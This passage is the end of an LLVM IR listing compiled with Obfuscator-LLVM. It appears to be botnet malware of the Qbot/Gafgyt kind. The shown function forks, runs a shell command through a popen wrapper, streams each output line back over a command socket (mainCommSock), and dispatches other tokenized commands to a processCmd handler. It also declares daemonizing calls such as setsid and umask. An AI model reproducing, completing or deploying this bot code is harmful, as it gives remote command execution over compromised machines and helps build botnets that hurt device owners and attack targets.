  %206 = icmp eq i8 %205, 0
  br i1 %206, label %._crit_edge132.loopexit, label %.lr.ph131

._crit_edge132.loopexit:                          ; preds = %.lr.ph131
  br label %._crit_edge132

._crit_edge132:                                   ; preds = %._crit_edge132.loopexit, %196
  %207 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.489, i64 0, i64 0)) #15
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %209, label %224

; <label>:209:                                    ; preds = %._crit_edge132
  %210 = call i32 @listFork()
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %.backedge

; <label>:212:                                    ; preds = %209
  %213 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %213, i8 0, i64 1024, i32 16, i1 false)
  %214 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %213, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.490, i64 0, i64 0), i8* %197)
  %215 = call i32 @fdpopen(i8* nonnull %213, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  %216 = call i8* @fdgets(i8* nonnull %213, i32 1024, i32 %215)
  %217 = icmp eq i8* %216, null
  br i1 %217, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %212
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %213)
  %218 = load i32, i32* @mainCommSock, align 4
  %219 = call i32 (i32, i8*, ...) @sockprintf(i32 %218, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i64 0, i64 0), i8* nonnull %213)
  call void @llvm.memset.p0i8.i64(i8* nonnull %213, i8 0, i64 1024, i32 16, i1 false)
  %220 = call i32 @sleep(i32 1) #3
  %221 = call i8* @fdgets(i8* nonnull %213, i32 1024, i32 %215)
  %222 = icmp eq i8* %221, null
  br i1 %222, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %212
  %223 = call i32 @fdpclose(i32 %215)
  call void @exit(i32 0) #17
  unreachable

; <label>:224:                                    ; preds = %._crit_edge132
  %225 = call i8* @strtok(i8* %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #3
  store i8* %186, i8** %101, align 16
  %226 = icmp eq i8* %225, null
  br i1 %226, label %._crit_edge137.thread, label %.lr.ph136.preheader

.lr.ph136.preheader:                              ; preds = %224
  br label %.lr.ph136

._crit_edge137.thread:                            ; preds = %224
  call void @processCmd(i32 1, i8** nonnull %101)
  br label %.backedge

.lr.ph136:                                        ; preds = %.lr.ph136.preheader, %239
  %.083134 = phi i8* [ %240, %239 ], [ %225, %.lr.ph136.preheader ]
  %.084133 = phi i32 [ %.1, %239 ], [ 1, %.lr.ph136.preheader ]
  %227 = load i8, i8* %.083134, align 1
  %228 = icmp eq i8 %227, 10
  br i1 %228, label %239, label %229

; <label>:229:                                    ; preds = %.lr.ph136
  %230 = call i64 @strlen(i8* nonnull %.083134) #15
  %231 = add i64 %230, 1
  %232 = call noalias i8* @malloc(i64 %231) #3
  %233 = sext i32 %.084133 to i64
  %234 = getelementptr inbounds [10 x i8*], [10 x i8*]* %10, i64 0, i64 %233
  store i8* %232, i8** %234, align 8
  %235 = call i64 @strlen(i8* nonnull %.083134) #15
  %236 = add i64 %235, 1
  call void @llvm.memset.p0i8.i64(i8* %232, i8 0, i64 %236, i32 1, i1 false)
  %237 = call i8* @strcpy(i8* %232, i8* nonnull %.083134) #3
  %238 = add nsw i32 %.084133, 1
  br label %239

; <label>:239:                                    ; preds = %.lr.ph136, %229
  %.1 = phi i32 [ %238, %229 ], [ %.084133, %.lr.ph136 ]
  %240 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #3
  %241 = icmp eq i8* %240, null
  br i1 %241, label %._crit_edge137, label %.lr.ph136

._crit_edge137:                                   ; preds = %239
  call void @processCmd(i32 %.1, i8** nonnull %101)
  %242 = icmp sgt i32 %.1, 1
  br i1 %242, label %.lr.ph140.preheader, label %.backedge

.lr.ph140.preheader:                              ; preds = %._crit_edge137
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph140

.lr.ph140:                                        ; preds = %.lr.ph140.preheader, %.lr.ph140
  %indvars.iv154 = phi i64 [ %indvars.iv.next155, %.lr.ph140 ], [ 1, %.lr.ph140.preheader ]
  %243 = getelementptr inbounds [10 x i8*], [10 x i8*]* %10, i64 0, i64 %indvars.iv154
  %244 = load i8*, i8** %243, align 8
  call void @free(i8* %244) #3
  %indvars.iv.next155 = add nuw nsw i64 %indvars.iv154, 1
  %exitcond = icmp eq i64 %indvars.iv.next155, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph140
}

declare i32 @umask(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fputs(i8* nocapture readonly, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #3

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2}
!2 = !{!"llvm.loop.unroll.disable"}
!3 = !{i32 -2146541122}
!4 = !{i32 -2146539624}
!5 = !{i32 -2146538867}
!6 = !{i32 -2146538147}
!7 = distinct !{!7, !2}
!8 = !{i32 -2146537205}
!9 = !{i32 -2146535726}
!10 = !{i32 -2146535009}
!11 = !{i32 -2146534171}
!12 = distinct !{!12, !2}
